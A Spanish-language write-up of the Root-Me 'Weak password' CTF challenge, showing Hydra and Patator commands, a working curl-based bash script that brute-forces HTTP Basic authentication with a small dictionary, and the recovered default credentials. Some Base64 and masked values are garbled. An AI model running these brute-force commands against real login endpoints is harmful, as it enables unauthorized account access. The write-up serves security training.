Writeup: Weak Password - Root-Me CTF
🎯 Información General
Campo	Detalle
Plataforma	Root-Me
Categoría	Web-Server
Reto	Weak password
Dificultad	10 Puntos (Muy fácil)
Enlace	https://challenge01.root-me.org/web-serveur/ch3/
📖 Descripción del Reto

El reto consiste en un panel de autenticación protegido por HTTP Basic Authentication, el típico popup de usuario y contraseña que aparece en el navegador. El objetivo es encontrar las credenciales de acceso.
Objetivo

Obtener las credenciales de acceso y validar la contraseña en la plataforma Root-Me.
🔍 Metodología de Resolución
1. Análisis Inicial

Al acceder al endpoint, el servidor responde con un 401 Unauthorized solicitando autenticación:
http

HTTP/1.1 401 Unauthorized
Server: nginx
WWW-Authenticate: Basic realm="Restricted access"

La autenticación es Basic, lo que significa que las credenciales viajan en el header Authorization codificadas en Base64.
2. Intento Manual con Credenciales Comunes

Probando combinaciones comunes directamente en el navegador:
http

Authorization: Basic YW2RtaW456YWRt***aW4=  # *********:********

Resultado: ✅ Éxito - El servidor responde con HTTP 200 OK y muestra el mensaje de validación.
html

<h3>Bien joué, vous pouvez utiliser ce mot de passe pour valider le challenge</h3>
<h3>Well done, you can use this password to validate the challenge</h3>

Credenciales encontradas: *******:**********
🛠️ Herramientas Probadas y Análisis de Fallos
🔴 Hydra (fallo)

Comando utilizado:
bash

hydra -L diccionario.txt -P diccionario.txt challenge01.root-me.org http-get /web-serveur/ch3/ -V

Resultado: 0 valid password found en 225 intentos.

Explicación del fallo:

    User-Agent bloqueado: Nginx puede detectar y bloquear el User-Agent de Hydra (Hydra), respondiendo con 401 aunque las credenciales sean correctas.

    HTTP/1.0 vs HTTP/1.1: Hydra usa por defecto HTTP/1.0, mientras que el servidor espera HTTP/1.1 con ciertas cabeceras.

    Rate Limiting: El servidor puede estar limitando el número de intentos por IP desde herramientas automatizadas.

🔴 Patator (fallo)

Comando incorrecto probado:
bash

patator http_fuzz auth_type=basic url=... user_pass=FILE0 0=diccionario.txt -x ignore:code=401

Resultado: Hits/Done/Skip/Fail/Size: 0/0/0/0/0 (sin intentos).

Explicación del fallo:

    Sintaxis incorrecta: user_pass=FILE0 espera líneas con formato usuario:contraseña, no palabras sueltas.

    Comando corregido (que hubiera funcionado):
    bash

    patator http_fuzz auth_type=basic url=... user=******* password=FILE0 0=diccionario.txt -x ignore:code=401

🟢 Script con Curl (éxito)

Script utilizado (script.sh):
bash

#!/bin/bash
URL="http://challenge01.root-me.org/web-serveur/ch3/"
USUARIOS="diccionario.txt"
PASSWORDS="diccionario.txt"

while IFS= read -r user; do
    [ -z "$user" ] && continue
    while IFS= read -r pass; do
        [ -z "$pass" ] && continue
        response=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" "$URL")
        if [ "$response" = "200" ]; then
            echo "✅ ¡ENCONTRADO! $user:$pass"
            break 2
        fi
    done < "$PASSWORDS"
done < "$USUARIOS"

Resultado:
text

🔹 Intento 33: admin:admin
✅ ¡ENCONTRADO!
👤 Usuario: **********
🔑 Contraseña: *********

¿Por qué funciona?

    curl imita exactamente las peticiones de un navegador.

    No utiliza User-Agent sospechoso.

    Soporta HTTP/1.1 y mantiene las cabeceras estándar.

    La autenticación Basic se maneja de forma nativa y correcta.

📊 Comparativa de Herramientas
Herramienta	Resultado	Motivo del Fallo/Éxito
Navegador	✅ Éxito	Autenticación Basic estándar
Curl	✅ Éxito	Peticiones limpias, sin bloqueos
Hydra	❌ Fallo	User-Agent bloqueado, HTTP/1.0
Patator	❌ Fallo	Sintaxis incorrecta para el diccionario
🔐 Autenticación Basic HTTP
¿Cómo funciona?

    El cliente envía credenciales codificadas en Base64:

http

Authorization: Basic YW2RtaW456YWRt***aW4=

    El servidor decodifica y verifica:

bash

echo YWRtaW46YWRtaW4= | base64 -d
# Resultado: ***********:*************

    Si son válidas, responde con HTTP 200 OK.

Por qué este reto es "Weak Password"

    El servidor utiliza credenciales por defecto (admin:admin).

    No implementa protección contra fuerza bruta.

    La autenticación Basic es vulnerable a ataques de diccionario.

📸 Capturas del Proceso
Captura 1: Solicitud en Burp Suite
text

GET /web-serveur/ch3/ HTTP/1.1
Host: challenge01.root-me.org
Authorization: Basic YW2RtaW456YWRt***aW4=

Captura 2: Decodificación Base64
bash

echo YW2RtaW456YWRt***aW4= | base64 -d
**********:***********

Captura 3: Respuesta del Servidor
html

HTTP/1.1 200 OK
Server: nginx
Content-Type: text/html; charset=UTF-8

<html>
  <body>
    <h3>Bien joué, vous pouvez utiliser ce mot de passe pour valider le challenge</h3>
    <h3>Well done, you can use this password to validate the challenge</h3>
  </body>
</html>

🎓 Lecciones Aprendidas
Sobre Herramientas de Fuerza Bruta

    No todas las herramientas son infalibles: Hydra y Patator pueden fallar por detalles como User-Agent o versión HTTP.

    Curl es el rey: Para autenticación Basic, curl es la herramienta más fiable.

    Scripting propio: Cuando las herramientas fallan, un script simple con curl suele resolverlo.

Sobre Autenticación Basic

    Es vulnerable por defecto: Las credenciales viajan en texto plano (solo codificadas, no cifradas).

    Siempre probar credenciales por defecto: root:root, admin:password, etc.

    Es fácil de automatizar: Con curl o cualquier cliente HTTP.

📁 Anexos
Diccionario utilizado
txt

Administrador
Admin
admin
password
123456
root
toor
test
qwerty
letmein
welcome
admin123
Pass
Password
Guest

Script completo (funcional)
bash

#!/bin/bash
URL="http://challenge01.root-me.org/web-serveur/ch3/"
USUARIOS="diccionario.txt"
PASSWORDS="diccionario.txt"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}🔍 Iniciando fuerza bruta HTTP Basic${NC}"
total=0

while IFS= read -r user; do
    [ -z "$user" ] && continue
    while IFS= read -r pass; do
        [ -z "$pass" ] && continue
        total=$((total + 1))
        echo -ne "${YELLOW}🔹 Intento $total:${NC} $user:$pass\r"
        response=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" "$URL" 2>/dev/null)
        if [ "$response" = "200" ]; then
            echo -e "\n${GREEN}✅ ¡ENCONTRADO!${NC}"
            echo "========================================"
            echo -e "${GREEN}👤 Usuario: $user${NC}"
            echo -e "${GREEN}🔑 Contraseña: $pass${NC}"
            echo "========================================"
            curl -s -u "$user:$pass" "$URL" | grep -o "<h3>.*</h3>" | sed 's/<[^>]*>//g'
            exit 0
        fi
    done < "$PASSWORDS"
done < "$USUARIOS"

echo -e "\n❌ No se encontraron credenciales válidas"

🏁 Conclusión

El reto "Weak password" se resuelve identificando que la autenticación es Basic HTTP y probando credenciales comunes. Aunque herramientas como Hydra y Patator fallaron por detalles técnicos (User-Agent bloqueado, sintaxis incorrecta), un script con curl encontró rápidamente las credenciales admin:admin.

Flag/Password: ******************
